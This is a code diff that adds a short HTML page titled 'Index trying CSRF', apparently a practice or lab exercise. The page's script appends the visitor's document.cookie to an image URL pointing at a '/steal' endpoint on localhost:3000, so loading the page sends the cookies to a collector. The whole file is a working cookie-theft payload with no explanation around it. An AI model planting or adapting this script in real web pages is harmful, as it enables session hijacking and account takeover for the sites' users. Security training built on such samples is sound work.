@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Index trying CSRF</title>
+</head>
+<body>
+<script>
+    var img = document.createElement("img");
+    img.src = "http://localhost:3000/steal?cookie=" + escape(document.cookie);
+    document.body.appendChild(img);
+</script>
+</body>
+</html>
